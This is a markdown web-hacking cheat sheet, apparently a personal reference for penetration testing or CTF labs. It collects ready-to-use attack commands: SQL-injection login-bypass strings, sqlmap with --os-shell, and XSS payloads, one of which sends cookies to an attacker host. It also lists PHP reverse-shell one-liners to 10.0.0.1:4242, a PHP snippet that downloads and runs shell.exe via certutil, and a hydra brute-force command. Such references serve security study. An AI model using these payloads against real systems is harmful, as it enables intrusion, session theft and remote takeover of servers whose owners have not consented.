# Web Hacking Cheatsheet

<!--
##################################################################
##################################################################
-->

## Enumeration

### Directory Scan Using Gobuster

`gobuster dir -w /usr/share/seclists/Discovery/Web-Content/name of list -u http://targetURL`

### cURL

#### Links

[Everything curl](https://everything.curl.dev/)

#### GET Request

`curl http://targetURL`

#### GET Request Save Cookie

`curl -c /tmp/cookies http://targetURL`

#### GET Request with Cookie

`curl -b 'cookiename=cookievalue' https://google.com`

#### POST Request

`curl -X POST --data randomdata http://targetURL`

#### File Upload

`curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`

#### Set content length

`curl -d "" -X POST http://targetsite`

<!--
##################################################################
##################################################################
-->

## OAuth

#### Enumerating Metadata

**Find OAuth Server URL and make requests below**
`GET /.well-known/oauth-authorization-server`
`GET /.well-known/openid-configuration`
**EXAMPLE** `curl https://accounts.google.com/.well-known/openid-configuration`

<!--
##################################################################
##################################################################
-->

## SQLI

#### Test for SQLI with SQLMAP Using Cookie

`sqlmap -u 'http://website.address?field=to-test' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`

#### Use SQLMAP to Get Shell

`sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=802vjt3crnju4eg3ib0q04ge9v" --os-shell`

#### Bypass Authentication with SQL Injection

`' or 1=1 --`

`a' or 1=1 --`

`" or 1=1 --`

`a" or 1=1 --`

`' or 1=1 #`

`" or 1=1 #`

`or 1=1 --`

`' or 'x'='x`

`" or "x"="x`

`') or ('x'='x`

`") or ("x"="x`

<!--
##################################################################
##################################################################
-->

## XSS

#### XSS Payloads

[PayloadsAllTheThings XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
[Payloadbox xss-payload-list](https://github.com/payloadbox/xss-payload-list)

| Code                                                                                     | Description                   |
| ---------------------------------------------------------------------------------------- | ----------------------------- |
| **Payloads**                                                                             |
| `<script>alert(window.origin)</script>`                                                  | Basic XSS Payload             |
| `<plaintext>`                                                                            | Basic XSS Payload             |
| `<script>print()</script>`                                                               | Basic XSS Payload             |
| `<img src="" onerror=alert(window.origin)>`                                              | HTML-based XSS Payload        |
| `<script>document.body.style.background = "#141d2b"</script>`                            | Change Background Color       |
| `<script>document.body.background = "https://www.test.com/images/logo-htb.svg"</script>` | Change Background Image       |
| `<script>document.title = 'TEST'</script>`                                               | Change Website Title          |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`           | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>`                          | Remove certain HTML element   |
| `<script src="http://OUR_IP/script.js"></script>`                                        | Load remote script            |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`          | Send Cookie details to us     |

### [XSStrike](https://github.com/s0md3v/XSStrike)

**Tool for detecting XSS**

#### Run a Scan

`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`

### [XSS-Cookie-Stealer](https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py)

**Tool for cookie hijacking**

<!--
##################################################################
##################################################################
-->

## [SQLite](https://www.sqlitetutorial.net/sqlite-commands/)

#### Access Database

`sqlite3 databasename.db`

#### Show Tables

`.tables`

#### Show Table Info

`PRAGMA table_info(tablename);`
`.schema tablename`

#### Dump Info From Table

`SELECT * FROM customers;`
`.dump tablename`

<!--
##################################################################
##################################################################
-->

## Shells

#### PHP

`php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'`

`php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

#### Windows PHP Reverse Shell

`wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php`

#### Grab and Execute File

```
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.203/shell.exe"', $val);
sleep(5);
$exec = system('shell.exe', $val);
?>
```

<!--
##################################################################
##################################################################
-->

## Local File Inclusion

#### Check for if reverse shell possible after =

**Start Netcat Listener**

`nc -nlvp 80`

**Attempt to send request to Netcat listener**

`curl http://targeturl/site/index.php?page=http://NetcatAddress/test`

<!--
##################################################################
##################################################################
-->

## Brute Forcing

#### Web Login

`hydra -L /home/n0m4d1k/usernames -P /usr/share/wordlists/rockyou.txt -t 16 172.30.73.80 http-post-form "/login.php:username=^USER^&password=^PASS^&action=Login:Incorrect username or password"`

<!--
##################################################################
##################################################################
-->

## Useful Commands
